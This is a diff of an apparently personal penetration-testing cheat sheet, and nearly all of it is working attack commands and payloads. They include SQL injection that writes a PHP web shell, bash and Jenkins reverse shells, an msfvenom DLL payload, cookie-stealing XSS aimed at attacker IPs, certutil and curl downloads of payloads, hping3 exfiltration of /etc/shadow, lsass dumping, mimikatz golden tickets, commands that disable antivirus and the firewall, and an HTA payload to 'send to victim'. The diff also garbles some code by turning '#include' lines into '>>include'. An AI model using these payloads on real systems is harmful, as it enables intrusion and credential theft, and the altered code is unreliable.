@@ -19,14 +19,14 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
 https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 
 [sql injection: Oracle]
-# find number of columns
+>> find number of columns
 // ps: the datatype must be the same
 'UNION+SELECT+'a','a',1+FROM+DUAL--+
-# find all tables
+>> find all tables
 'UNION+SELECT+table_name,NULL,1+FROM+all_tables--+
-# find column name based from table name
+>> find column name based from table name
 'UNION+SELECT+column_name,NULL,1+FROM+all_tab_columns+WHERE+table_name='WEB_ADMINS'--+
-# fetch data from table
+>> fetch data from table
 'UNION+SELECT+ADMIN_NAME,PASSWORD,1+FROM+WEB_ADMINS--+ 
 
 [sql trucation attack]
@@ -36,7 +36,7 @@ https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html
 '+UNION+SELECT+char(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,109,100,39,93,63,62),null+into+outfile+'/var/www/html/shell.phtml'-- -
 
 [windows priv esc]
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sam-and-system-files
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>>sam-and-system-files
 
 [filetransfer]
 	[[netcat]]
@@ -83,7 +83,7 @@ sshuttle -vr root@10.200.48.200 --ssh-cmd "ssh -i id_rsa.bak" 10.200.48.200/24
 nmap -sV --script "rsync-list-modules" -p 873 10.10.10.10
 rsync -av --list-only rsync://10.10.10.10/Modules
 rsync -av rsync://10.10.222.11/Conf ./shared
-# reference
+>> reference
 https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
 
 [autosolve crypto]
@@ -123,7 +123,7 @@ https://github.com/opsxcq/exploit-CVE-2014-6271
 [windows:secretsdump]
 secretsdump.py -sam SAM -system SYSTEM LOCAL
 secretsdump.py -just-dc hololive.local/DC01\$@10.10.225.71
-# DCSync
+>> DCSync
 secretsdump.py THROWBACK.local/jeffersd:Throwback2020@10.200.3.117 -dc-ip 10.200.3.117
 
 [xfreerdp]
@@ -137,14 +137,14 @@ winexe -U 'administrator' //10.10.10.10 'cmd.exe'
 certutil -URLCache -f http://10.8.2.121:9005/setup.msi  c:\Temp\setup.msi
 
 [service enumeration]
-# check the service privilege
+>> check the service privilege
 $ services
-## can you modify any service?
+>>>> can you modify any service?
 $ cmd /c 'sc config <service> binpath="C:\test.exe"'
-## can you modify any binary that is executed by any services?
+>>>> can you modify any binary that is executed by any services?
 $ icacls services\monitor1.exe
 	if yes
-	# can we start the service?
+	>> can we start the service?
 	$ cmd /c 'sc sdshow monitor1'
 
 [tomcat curl upload]
@@ -189,19 +189,19 @@ $ for commit in $(seq 1 $(git reflog | wc -l)); do git diff HEAD@{$commit} 2>/de
 https://github.com/nidem/kerberoast
 
 [kerbrute]
-## userenum
+>>>> userenum
 kerbrute userenum -d spookysec.local --dc 10.10.10.10 users.txt
-## bruteuser
+>>>> bruteuser
 kerbrute bruteuser -d spookysec.loccal --dc 172.0.0.1 passwords.txt <user>
 
 [getNPuser.py]
 python3 getNPusers.py spookysec.local/ -no-pass -usersfile users.txt -request
-# to get TGT: AsREP attack
+>> to get TGT: AsREP attack
 
 [getUserSPNs.py]
-# requirements: need credentials
+>> requirements: need credentials
 python3 getUserSPNs.py spookysec.local/user:password -dc-ip 172.0.0.1 -request 
-# to get TGS: Kerberoasting
+>> to get TGS: Kerberoasting
 
 [rejetto rce]
 http://172.31.1.24/?search=%00{.exec|certutil.exe%20-urlcache%20-f%20http://10.10.0.84/ch4rm.exe%20C:\Users\Public\ch4rm.exe.}
@@ -359,7 +359,7 @@ GetNPUsers.py roast.csl/ -dc-ip 10.10.10.10 -no-pass -usersfile users
 
 [smb with hash]
 smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 ADMIN.offshore.com/bankvault@172.16.4.31
-smbclient.py CORE.cyber.local/george.wirth:'v765#QLm^8'@10.9.10.10 -dc-ip 10.9.10.10
+smbclient.py CORE.cyber.local/george.wirth:'v765>>QLm^8'@10.9.10.10 -dc-ip 10.9.10.10
 smbmap -H 172.16.4.31 -u bankvault -p aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 -d ADMIN.offshore.com
 
 [Impoersonate_tokens: PrintSpoofer]
@@ -370,17 +370,17 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 
 [DLL Hijacking]
 * msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.84 LPORT=1337 -f dll -o Customs.dll
-* sc qc <service> # check service 
-* icacls  #check permission on currentdirectory
+* sc qc <service> >> check service 
+* icacls  >>check permission on currentdirectory
 * sc start <service>
 
 [disable windows AV]
 powershell Set-MpPreference -DisableRealtimeMonitoring $true
 
 [disable windows firewall]
-# cmd
+>> cmd
 netsh advfirewall set allprofiles state off
-# powershell
+>> powershell
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 [dll hijacking]
@@ -423,16 +423,16 @@ crackmapexec smb 172.16.1.101 -u wsadmin -H '669b12a3bac275251170afbe2c5de8c2' -
 crackmapexec smb 10.10.110.24 -u wsadmin -H '00000000000000000000000000000000' --sam
 crackmapexec smb 10.10.10.14 -u salvador -p "password" --shares --pass-pol
 crackmapexec winrm ./targets.txt -u dummy -p 'P!@$$w0rd!' 
-#more cheatsheets
+>>more cheatsheets
 https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
 
 [xss bypass]
 <SCRscriptIPT>document.location='http://10.14.3.113/ape.js?c='+document.cookie</SCRscriptIPT>
 <SCRscriptIPT>new Image().src="http://localhost/cookie.php?c="+document.cookie;</SCRscriptIPT>
-#make sure to use html entities
+>>make sure to use html entities
 
 [storred xss: embed register form]
-# 1st method (POST)
+>> 1st method (POST)
 ```
 <script>
 var xhr = new XMLHttpRequest();
@@ -445,7 +445,7 @@ xhr.onload=function(){
 xhr.send('username=ch4rm&password=password&set_admin=admin&action=Register');
 </script>
 ```
-#2nd method (GET)
+>>2nd method (GET)
 ```
 <form action="http://172.30.68.55/register.php" name="yo" method="POST">
 <input type="hidden" name="username" id="username" value="ch4rm">
@@ -465,13 +465,13 @@ cat</etc/passwd
 X=$'cat\x20/etc/passwd'&&$X
 
 [docker security]
-# restart if crash
+>> restart if crash
 /usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
-# mount root directory to mnt using docker api
+>> mount root directory to mnt using docker api
 docker -H tcp://10.10.25.34:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
-# mount root directory to mnt using socker daemon
+>> mount root directory to mnt using socker daemon
 ./docker -H unix:///tmp/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
-# using docker socket with curl
+>> using docker socket with curl
 https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd
 
 [mounting shares]
@@ -491,24 +491,24 @@ nmap --script "snmp* and not snmp-brute" -p 161 -sU 192.168.68.108
 snmpwalk -v3 -a SHA -A STrP@SSWRD -x AES -X STr0ngP@SSWRD -l authPriv -u snmpadmin localhost | head
 
 [udp reverse shell]
-# listening
+>> listening
 nc.traditional -ulvnp 1337
-# attacker
+>> attacker
 bash -i >& /dev/udp/127.0.0.1/4242 0>&1
 
 [sqli: boolean based sql injection]
 1. 0 or length(database())="6"
-# get the database name letters by letters
+>> get the database name letters by letters
 2. 0 or substring(database(),1,1)='d'
 2.1 0 or substring(database(),2,1)='a'
-# get the database name letter sby letters using `like`
+>> get the database name letter sby letters using `like`
 3. 0 or database() like '%a%'
 3.1 0 or database() like 'a%'
 3.2 0 or databasE() like 'd__k'
 ' or (select (ascii(substr((select database()), 1, 1))) = 104)-- -
 ' or (select (ascii(substr((select table_name from information_schema.tables where table_schema=database()), 1, 1))) = 104)-- -
 ' or (select (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='user'), 1, 1))) = 104)-- -
-# command injection in sqli
+>> command injection in sqli
 /ping?id=3995 UNION SELECT 1,'|ping 10.4.0.68'-- -
 
 [sql read and write]
@@ -518,7 +518,7 @@ SELECT LOAD_FILE('/etc/passwd')
 SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
 SELECT file_priv FROM mysql.user WHERE user = 'netspi'
 SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'
-#reference: https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/#mysql
+>>reference: https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/>>mysql
 
 [stored credentials on windows]
 cmdkey /list
@@ -557,13 +557,13 @@ public class testprog {
 }
 ```
 
-* jenkins#1
+* jenkins>>1
 ```
 def command = "whoami"
 def proc = command.execute()
 println(proc.in.text)
 ```
-* jenkins#2
+* jenkins>>2
 ```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -572,9 +572,9 @@ p.waitFor()
 
 [ld preload privilege escalation]
 ```
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
+>>include <stdio.h>
+>>include <sys/types.h>
+>>include <stdlib.h>
 void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
@@ -627,9 +627,9 @@ https://github.com/TBGSecurity/splunk_shells
 https://www.n00py.io/2018/10/popping-shells-on-splunk/
 
 [responder]
-# LLMNR Poisoning
+>> LLMNR Poisoning
 responder -I tun0 -rdwv
-# SCF Attack
+>> SCF Attack
 responder -wrf --lm -v -I tun0
 
 [wpscan]
@@ -653,7 +653,7 @@ convert exploit.mvg exploit.png
 sudo 2to3-2.7 -w -n light.py --output=/root/script
 
 [hta payload]
-#Save as something.hta and send to victim
+>>Save as something.hta and send to victim
 ```
 <script %00 >
     lets=ActiveXObject;
@@ -693,26 +693,26 @@ for python;
 
 [Json Brute Force]
 python3 jsonbrute.py --url http://management.test.local/api/login --wordlist rockyou.txt --data "username=admin, password=FUZZ, recaptcha= " --code 200 --verbose
-#https://github.com/Jake-Ruston/JSONBrute
+>>https://github.com/Jake-Ruston/JSONBrute
 
 [hping3 file transfer8]
-# sender
+>> sender
 /usr/sbin/hping3 -1 127.0.0.1 -e signature -E /etc/shadow -d 500
-# listener
+>> listener
 /usr/sbin/hping3 -1 127.0.0.1 -9 signature -I lo
 
 [sqlmap]
-# enter specific parameter
+>> enter specific parameter
 -p username,password
-# view privilege
+>> view privilege
 --privilege
-# enter os command/upload webshell
+>> enter os command/upload webshell
 --os-shell
-# write file
+>> write file
 sqlmap -u 'http://example.com/?username=admin' --dbs --level 4 --risk 3 --file-write shell.php --file-dest '/var/www/html/shell.php'
-# dump database
+>> dump database
 sqlmap -u 'http://10.10.110.124/login.php?username=admin&password=admin' --dbs --batch --level 4 --risk 3
-# with Basic Authentication
+>> with Basic Authentication
 sqlmap -u 'http://10.10.110.124/login' --form --dbs --batch --level 4 --risk 3 --headers="Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
 sqlmap --url 'http://10.10.45.118/login' --method=POST --data="username=admin&password=admin" -p "username,password" --risk=3 --level=3 --random-agent -D sqhell_2 --dump-all --threads 10
 
@@ -722,25 +722,25 @@ swaks --to admin@openmailbox.xyz --from david@openmailbox.xyz --header 'Subject:
 [lfi:php fileststem attack vectors]
 Reference: https://www.ush.it/2009/02/08/php-filesystem-attack-vectors/
 ```
-# null bytes at the end to avoid extensions
+>> null bytes at the end to avoid extensions
 ../../../var/log/something.log%00
-# avoid black listed extensions or words
+>> avoid black listed extensions or words
 ciccio.php/.
 ciccio.php/
-# alternative
+>> alternative
 ' and die(show_source("/etc/passwd")) or '
 encoded: '%20and%20die(show_source(%22/etc/passwd%22))%20or%20'
 ' and die(system("curl http://192.168.68.108/revshell.php|php")) or '
 ```
 
 [redis-cli]
-# check info
+>> check info
 info
-# select db
+>> select db
 select <index>
-# select available keys
+>> select available keys
 keys *
-# view items
+>> view items
 get <item>
 
 [bypassing cheatsheet]
@@ -751,23 +751,23 @@ dig axfr @192.168.0.102 webmaster.htb
 dig any @192.168.0.102 webmaster.htb
 
 [accesschk.exe]
-# check service permission to the user
+>> check service permission to the user
 accesschk.exe /accepteula -uwcqv user <service>
-# check service with unquoted path
+>> check service with unquoted path
 accesschk.exe /accepteula -ucqv user unquotedsvc
-# check writable path
+>> check writable path
 accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
 
 [AD Module]
-# GET ad user
+>> GET ad user
 Get-ADUser -Identity asalam
-# Get users right 
+>> Get users right 
 (get-acl "AD:\CN=Ahmad Salam,CN=Users,DC=CH4RM,DC=local").access | select identityreference,activedirectoryrights
 
 [PowerView]
-# List all domain user
+>> List all domain user
 Get-DomainUser
-# List all group members
+>> List all group members
 Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember
 
 [scf attack]
@@ -793,17 +793,17 @@ $secretStuff = Get-Content  -Path secretstuff.txt | ConvertTo-SecureString; [Run
 New-PSDrive -Credential $cred -PSProvider FileSystem -Name ch4rm \\10.10.10.10\C$
 
 [powerupsql]
-# cheatsheet
+>> cheatsheet
 https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
-# enable xp_cmdshell
+>> enable xp_cmdshell
 Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "m3sqlw.m3c.local"'
-# execute command
+>> execute command
 Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "m3sqlw.m3c.local"'
 
 [pivoting: chisel]
-#listen 
+>>listen 
 ./chisel server -p 8001 --reverse
-#remote 
+>>remote 
 ./chisel client 10.10.10.10:8001 R:1080:socks
 
 [limit rate bypass]
@@ -818,7 +818,7 @@ X-Host : IP
 https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
 
 [NTLM Relay]
-# if you cant crack the NTLMv2 hash, then relay it!
+>> if you cant crack the NTLMv2 hash, then relay it!
 * turn off http,smb in /etc/Responder.conf
 Responder -I tun0 -rdvw
 * Create a targets.txt containing list of targets ip (i.e. all://10.10.10.10)
@@ -836,96 +836,96 @@ https://github.com/jeroennijhof/vncpwd
 vncpwd <vnc password file>
 
 [ansible crack]
-# crack with ansible2john if needed, make sure to preserver new lines"\n"
-# method 1
+>> crack with ansible2john if needed, make sure to preserver new lines"\n"
+>> method 1
 echo '$ANSIBLE_VAULT;1.1;AES256
 36643662303931336362356361373334663632343139383832626130636237333134373034326565
 3736626632306265393565653338356138626433333339310a323832663233316666353764373733
 30613239313731653932323536303537623362653464376365383963373366336335656635666637
 3238313530643164320a336337303734303930303163326235623834383337343363326461653162
 33353861663464313866353330376566346636303334353732383564633263373862' | ansible-vault decrypt && echo
-# method 2 
+>> method 2 
 ansible-vault view --ask-vault-pass encrypted.txt
 
 [password cracking]
-## johntheripper
+>>>> johntheripper
 john --wordlist=/opt/rockyou.txt hash
-## hashcat
+>>>> hashcat
 hashcat -a 0 -m 13100 hash.txt /opt/rockyou.txt
 
 [Rubeus]
-#### Retrieve hash from plain-text
+>> Retrieve hash from plain-text
 $ Rubeus.exe hash /password:P@$$w0rd! /user:studentuser /domain:DEV
-#### Request TGT from KDC (Do not reaquire local administrator priv)
+>> Request TGT from KDC (Do not reaquire local administrator priv)
 $ Rubeus.exe asktgt /user:studentuser /password:P@$$w0rd! /domain:DEV
 $ Rubeus.exe asktgt /user:studentuser /rc4:<ntlm has> /domain:DEV
-#### Request TGS from specific application server
+>> Request TGS from specific application server
 $ Rubeus.exe asktgs /ticket:tick.kirbi /service:HTTP/dc01.eu.local /dc:eu-dc.eu.local /domain:eu.local /ptt
-#### s4u delegation (method 1: without current user session)
+>> s4u delegation (method 1: without current user session)
 $ Rubeus.exe s4u /user:studentuser /rc4:<ntlm hash> /impersonateuser:administrator /msdsspn:"time/dc01.eu.local" /altservice:http,host,cifs /ptt
-#### s4u delegation (method 2: with current user session)
+>> s4u delegation (method 2: with current user session)
 $ Rubeus.exe tgtdeleg /nowrap
 $ Rubeus.exe s4u /ticket:<base64 blob> /impersonateuser:adminstrator /msdsspn:"time/dc01.eu.local" /altservice:http,host,cifs /ptt
-#### Inject ticket to klist
+>> Inject ticket to klist
 $ Rubeus.exe ptt /ticket:ticketfile.kirbi
 $ Rubeus.exe ptt /ticket:<base64 blob>
-#### Users' with SPN (Kerberoast)
+>> Users' with SPN (Kerberoast)
 $ Rubeus.exe kerberoast /nowrap
-#### monitor ticket
+>> monitor ticket
 $ Rubeus.exe monitor /interval:5
 
 [mimikatz]
-#### overpass-the-hash (this requires local administrator priv)
+>> overpass-the-hash (this requires local administrator priv)
 $ sekurlsa::pth /user:studentuser /ntlm:<ntlm hash> /domain:DEV /run:powershell.exe
-#### forged golden ticket with extra sids
+>> forged golden ticket with extra sids
 $ kerberos::golden /user:administrator /sid:<current-domain-sid> /sids:<trusted-domain-sid> /ktbtgt:<currentdomain-krbtgt-hash> /domain:curdomain.local /ptt
-#### DCsync
+>> DCsync
 $ lsadump::dcsync /domain:DEV.fortress.local /all /csv
-#### Dump trust keys
+>> Dump trust keys
 $ sekurlsa::trust /patch
-#### Forged inter-realm tgt with trust key (only works when sid history is enabled)
+>> Forged inter-realm tgt with trust key (only works when sid history is enabled)
 $ kerberos::golden /user:administrator /domain:dev.local /sid:<current-domain-sid> /rc4:<trust-key> /service:krbtgt /target:euvendor.local /sids:<trusted-domain-users-sid with RID>1000 > /ticket:saveticket.kirbi
-#### Dump tgt in current session (Unconstrained)
+>> Dump tgt in current session (Unconstrained)
 $ sekurlsa::tickets /export
-#### Minidump (when you have lsass.dmp file) ####
+>> Minidump (when you have lsass.dmp file) >>
 $ sekurlsa::minidump C:\Windows\Tasks\lsass.dmp
 $ sekrulsa::logonpasswords
 
 [Constrained Language Mode (CLM)]
-#### Check if you are in Constrained Mode
+>> Check if you are in Constrained Mode
 $Executioncontext.Sessionstate.Languagemode
-#### List all AppLocker Rules
+>> List all AppLocker Rules
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 [dump lsass with signed binary]
-#### Get lsass.exe PID
+* Get lsass.exe PID
 Get-Process lsass | select id
-#### Dump process with rundll32.exe
+* Dump process with rundll32.exe
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 736 C:\Windows\Tasks\lsass.dmp full
 
 [Abusing Printer Bug]
-#### Monitor ticket with rubeus.exe
+* Monitor ticket with rubeus.exe
 $ Rubeus.exe monitor /interval:5
-#### Use spoolsample.exe to initiate spooler connection
+* Use spoolsample.exe to initiate spooler connection
 $ spollssample.exe web.eu.local dc.eu.local
 
 [Get Shadow Principal]
-#### Use AD Module/RSAT
+>> Use AD Module/RSAT
 Get-ADObject -Filter * -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
 
 [PowerUpSQL: Enumerate Domain DB Instances]
-#### Get Local Instance
+>> Get Local Instance
 $ Get-SQLInstanceLocal -Verbose
-#### Get Instances in current domain
+>> Get Instances in current domain
 $ Get-SQLInstanceDomain -Verbose
-#### Get SQL linked server
+>> Get SQL linked server
 $ Get-SQLServerLinkCrawl -Instance us-mssql.techcorp.local
-#### Execute query in linked server
+>> Execute query in linked server
 $ Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
-#### Execute Query (enable xp_cmdshell and remote code exec)
+>> Execute Query (enable xp_cmdshell and remote code exec)
 $ Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "DB-SQLSRV"'
 $ Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
-#### Execute OS command on sql server
+>> Execute OS command on sql server
 Invoke-SQLOSCmd -Instance fortress-db -Command "whoami"
 
 [bruteforce_sid]
@@ -934,7 +934,7 @@ lookupsid.py vulnnet-rst.local/guest@10.10.130.156
 [ADIDNS]
 new-adidnsnode -node * -verbose
 grant-adidnspermission -node * -principal "Authenticated Users" -Access GenericAll -Verbose
-# Update DNS Record
+>> Update DNS Record
 Invoke-DNSUpdate -DNSType A -DNSName * -DNSData 192.168.21.123 -Verbose
 
 [Inveigh]
@@ -968,7 +968,7 @@ $shortcut.save()
 ```
 
 [SeBackupPrivilege]
-# able to dump SAM password
+>> able to dump SAM password
 cd c:\
 mkdir Temp
 reg save hklm\sam c:\Temp\sam
@@ -976,7 +976,7 @@ reg save hklm\system c:\Temp\system
 
 [log poisoning: smtp]
 ```
-#-----[/var/log/mail.log]-----
+>>-----[/var/log/mail.log]-----
 nc 10.10.10.10 25
 
 HELO test
@@ -984,7 +984,7 @@ MAIL FROM: "test <?php system($_GET['cmd']);?>"
 RCPT TO: root
 DATA
 .
-#RCE
+>>RCE
 ?page=/var/log/mail&cmd=ls -la
 ```
 
@@ -992,7 +992,7 @@ DATA
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.11.1.231
 
 [print nightmare]
-# check if vulnerable
+>> check if vulnerable
 rpcdump.py @10.10.120.242 | egrep 'MS-RPRN|MS-PAR
 
 [smb change password]
